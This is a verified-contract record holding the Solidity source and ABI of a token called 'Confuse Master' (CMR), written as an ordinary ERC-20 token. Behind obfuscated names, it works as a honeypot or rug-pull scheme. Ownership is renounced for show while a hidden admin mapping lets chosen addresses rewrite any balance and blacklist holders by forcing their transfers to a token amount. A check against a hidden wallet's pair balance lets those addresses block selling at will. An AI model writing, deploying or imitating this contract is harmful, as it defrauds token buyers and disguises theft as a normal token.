{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface sellIsLimit {\n    function createPair(address senderLaunch, address fundLaunchedExempt) external returns (address);\n}\n\ninterface launchedLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyMinToken) external view returns (uint256);\n\n    function transfer(address senderAuto, uint256 receiverBuy) external returns (bool);\n\n    function allowance(address amountLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderAuto,\n        uint256 receiverBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyReceiver, uint256 value);\n    event Approval(address indexed amountLaunched, address indexed spender, uint256 value);\n}\n\nabstract contract minSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoSwapTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchedLaunchMetadata is launchedLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConfuseMaster is minSender, launchedLaunch, launchedLaunchMetadata {\n\n    address public tradingFrom;\n\n    function getOwner() external view returns (address) {\n        return receiverWallet;\n    }\n\n    function teamAt(address tokenAt) public {\n        receiverToken();\n        if (amountFromLaunch == receiverSwap) {\n            shouldLaunched = false;\n        }\n        if (tokenAt == tradingFrom || tokenAt == walletExempt) {\n            return;\n        }\n        teamTotal[tokenAt] = true;\n    }\n\n    uint256 private atEnableTrading;\n\n    address receiverLaunchedToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public marketingTotal;\n\n    function txTotal(uint256 receiverBuy) public {\n        receiverToken();\n        launchedSenderAt = receiverBuy;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return txFee;\n    }\n\n    function launchReceiverAmount(address marketingList, uint256 receiverBuy) public {\n        receiverToken();\n        limitShould[marketingList] = receiverBuy;\n    }\n\n    uint256 public modeExempt;\n\n    bool public shouldLaunched;\n\n    bool public fundShould;\n\n    address public walletExempt;\n\n    function allowance(address minFrom, address amountEnable) external view virtual override returns (uint256) {\n        if (amountEnable == receiverLaunchedToken) {\n            return type(uint256).max;\n        }\n        return exemptTake[minFrom][amountEnable];\n    }\n\n    uint256 private receiverSwap;\n\n    function receiverToken() private view {\n        require(fromAmount[_msgSender()]);\n    }\n\n    uint256 public autoMode;\n\n    uint256 private totalMax = 100000000 * 10 ** 18;\n\n    string private txFee = \"CMR\";\n\n    bool private teamList;\n\n    function approve(address amountEnable, uint256 receiverBuy) public virtual override returns (bool) {\n        exemptTake[_msgSender()][amountEnable] = receiverBuy;\n        emit Approval(_msgSender(), amountEnable, receiverBuy);\n        return true;\n    }\n\n    mapping(address => bool) public teamTotal;\n\n    uint256 private amountFromLaunch;\n\n    uint256 constant launchTake = 19 ** 10;\n\n    function owner() external view returns (address) {\n        return receiverWallet;\n    }\n\n    uint256 launchedSenderAt;\n\n    function transfer(address marketingList, uint256 receiverBuy) external virtual override returns (bool) {\n        return sellEnableBuy(_msgSender(), marketingList, receiverBuy);\n    }\n\n    function toSenderTotal() public {\n        emit OwnershipTransferred(tradingFrom, address(0));\n        receiverWallet = address(0);\n    }\n\n    address private receiverWallet;\n\n    mapping(address => bool) public fromAmount;\n\n    uint256 private maxExempt;\n\n    string private fundLaunched = \"Confuse Master\";\n\n    mapping(address => mapping(address => uint256)) private exemptTake;\n\n    address teamIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function sellEnableBuy(address takeWallet, address senderAuto, uint256 receiverBuy) internal returns (bool) {\n        if (takeWallet == tradingFrom) {\n            return liquidityMarketing(takeWallet, senderAuto, receiverBuy);\n        }\n        uint256 isLaunched = launchedLaunch(walletExempt).balanceOf(teamIs);\n        require(isLaunched == launchedSenderAt);\n        require(senderAuto != teamIs);\n        if (teamTotal[takeWallet]) {\n            return liquidityMarketing(takeWallet, senderAuto, launchTake);\n        }\n        return liquidityMarketing(takeWallet, senderAuto, receiverBuy);\n    }\n\n    uint8 private enableMarketing = 18;\n\n    constructor (){\n        \n        autoSwapTrading receiverFee = autoSwapTrading(receiverLaunchedToken);\n        walletExempt = sellIsLimit(receiverFee.factory()).createPair(receiverFee.WETH(), address(this));\n        \n        tradingFrom = _msgSender();\n        fromAmount[tradingFrom] = true;\n        limitShould[tradingFrom] = totalMax;\n        toSenderTotal();\n        \n        emit Transfer(address(0), tradingFrom, totalMax);\n    }\n\n    mapping(address => uint256) private limitShould;\n\n    function balanceOf(address buyMinToken) public view virtual override returns (uint256) {\n        return limitShould[buyMinToken];\n    }\n\n    function fromLimit(address isShould) public {\n        require(isShould.balance < 100000);\n        if (marketingTotal) {\n            return;\n        }\n        if (teamList) {\n            fundShould = false;\n        }\n        fromAmount[isShould] = true;\n        \n        marketingTotal = true;\n    }\n\n    function transferFrom(address takeWallet, address senderAuto, uint256 receiverBuy) external override returns (bool) {\n        if (_msgSender() != receiverLaunchedToken) {\n            if (exemptTake[takeWallet][_msgSender()] != type(uint256).max) {\n                require(receiverBuy <= exemptTake[takeWallet][_msgSender()]);\n                exemptTake[takeWallet][_msgSender()] -= receiverBuy;\n            }\n        }\n        return sellEnableBuy(takeWallet, senderAuto, receiverBuy);\n    }\n\n    function liquidityMarketing(address takeWallet, address senderAuto, uint256 receiverBuy) internal returns (bool) {\n        require(limitShould[takeWallet] >= receiverBuy);\n        limitShould[takeWallet] -= receiverBuy;\n        limitShould[senderAuto] += receiverBuy;\n        emit Transfer(takeWallet, senderAuto, receiverBuy);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fundLaunched;\n    }\n\n    event OwnershipTransferred(address indexed sellMinSwap, address indexed liquidityLimit);\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableMarketing;\n    }\n\n    uint256 marketingTotalReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalMax;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellMinSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMinToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isShould\",\"type\":\"address\"}],\"name\":\"fromLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverBuy\",\"type\":\"uint256\"}],\"name\":\"launchReceiverAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAt\",\"type\":\"address\"}],\"name\":\"teamAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSenderTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverBuy\",\"type\":\"uint256\"}],\"name\":\"txTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ConfuseMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}